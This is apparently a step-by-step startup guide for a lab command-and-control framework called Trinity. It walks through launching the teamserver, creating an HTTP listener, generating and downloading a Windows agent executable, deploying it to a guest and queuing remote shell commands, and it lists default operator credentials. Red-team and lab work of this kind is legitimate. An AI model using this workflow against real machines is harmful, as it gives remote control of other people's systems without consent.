# Starting the framework (KAN-117)

The exact happy path, in order. `scripts/e2e-agent-test.sh` automates all of it against a live Windows
guest; this page is the same sequence by hand, with the API shape.

## 1. Configure

```bash
cp .env.example .env
# Set a private Postgres password and a JWT key of at least 32 bytes.
$EDITOR .env
```

`.env` feeds the compose substitutions:

| Variable                     | Used for                                                              |
| ---------------------------- | --------------------------------------------------------------------- |
| `POSTGRES_PASSWORD`          | the Postgres role; applied only when the data volume is first created |
| `JWT_KEY`                    | HS256 signing key for operator tokens (minimum 32 bytes)              |
| `JWT_ISSUER`, `JWT_AUDIENCE` | token claims; defaults are fine for a lab                             |

The first operator account is seeded from the `Bootstrap` section of `TeamServer/appsettings.json`
(`operator` / `trinity-operator` by default) or `Bootstrap__OperatorUsername` / `Bootstrap__OperatorPassword`.
**Change these before anything leaves the lab** — see [security.md](security.md).

## 2. Start the stack

Always name the compose file: a bare `docker compose` resolves to `compose.yaml`, the onion stack, not the C2
stack.

```bash
docker compose -f docker-compose.yml up -d --build
docker compose -f docker-compose.yml ps          # postgres healthy, teamserver healthy, migrator exited 0
```

The `migrator` is a one-shot `efbundle` container that applies migrations and exits; `teamserver` waits for it
(`service_completed_successfully`). Wait until `teamserver` is `healthy`.

```bash
curl -fsS http://localhost:5000/api/v1/server/status   # 200, anonymous
```

`GET /health` is an equivalent anonymous liveness check; the compose healthcheck uses
`/api/v1/server/status`.

## 3. Log in for a token

```bash
TOKEN=$(curl -s -X POST http://localhost:5000/api/v1/auth/login \
  -H 'Content-Type: application/json' \
  -d '{"Username":"operator","Password":"trinity-operator"}' | python3 -c 'import json,sys;print(json.load(sys.stdin)["Token"])')
AUTH="Authorization: Bearer $TOKEN"
```

Every operator endpoint requires this bearer token; an anonymous call returns `401`.

## 4. Create a listener

```bash
curl -s -X POST http://localhost:5000/api/v1/listeners/http -H "$AUTH" \
  -H 'Content-Type: application/json' -d '{
    "Name": "lab-listener",
    "Config": {
      "BindPort": 5069, "C2Port": 5069,
      "UserAgent": "Trinity Agent Client/1.0",
      "Header": "Content-Type: application/json",
      "Hosts": ["192.168.122.20"],
      "RotationStrategy": "Random",
      "MaxRetryStrategy": "Linear"
    }
  }'
```

`Hosts` must contain the address the **guest** uses to reach the host. The bind port must be free on the host.

## 5. Create a campaign

```bash
curl -s -X POST http://localhost:5000/api/v1/campaigns -H "$AUTH" \
  -H 'Content-Type: application/json' -d '{"Name":"lab","Status":"Active"}'
```

## 6. Generate a payload

The server compiles the bind-mounted `Agent/` working tree with the configured toolchain at generation time.

```bash
curl -s -X POST http://localhost:5000/api/v1/payloads/generate -H "$AUTH" \
  -H 'Content-Type: application/json' -d '{
    "Name": "lab-agent",
    "ListenerID": 1,
    "CampaignID": 1,
    "Architecture": "x64",
    "Type": "winexe",
    "OutputFormat": "exe",
    "RetryStrategy": "Linear",
    "isStageless": false
  }'
# -> {"id": <payloadID>}

curl -s -o agent.exe http://localhost:5000/api/v1/payloads/<payloadID> -H "$AUTH"
```

**Do not edit `Agent/` while this is running** — the bind mount is compiled live and a save mid-build races the
compiler. The harness prints `built payload locally` / `downloaded server-built payload` as the boundary.

## 7. Deploy and watch it check in

Copy `agent.exe` to the guest and start it in a way that survives the SSH session (OpenSSH runs each session
in a job object). A scheduled task or a session kept open both work; the harness uses a PowerShell launcher that
stays alive.

```bash
curl -s http://localhost:5000/api/v1/agents -H "$AUTH"          # the agent appears here
```

## 8. Queue a command

```bash
curl -s -X POST http://localhost:5000/api/v1/commands/<agentID>/spawn/shell -H "$AUTH" \
  -H 'Content-Type: application/json' -d '{"Command":"whoami"}'
# -> {"taskID": n, "message": "..."}
```

Read the result through the API: `GET /api/v1/tasks/tasks/<taskID>` returns `status`, `result` (the success
output) and `error` (the failure message). If you are debugging the pipeline itself, the database is still
the ground truth: a success stores `TaskResult.Result`; a failure sets `Tasks.Status = 'error'` and puts the
diagnostic in `Errors.Message`.

## 9. Use the Client

Open <http://localhost:5001>. The Blazor client proxies the same API and attaches the bearer token
(`AuthorizationMessageHandler`); log in with the same operator credentials.

## Next

- [deployment.md](deployment.md) — what runs where, and what a rebuild touches.
- [troubleshooting.md](troubleshooting.md) — the failure modes this project actually hit.
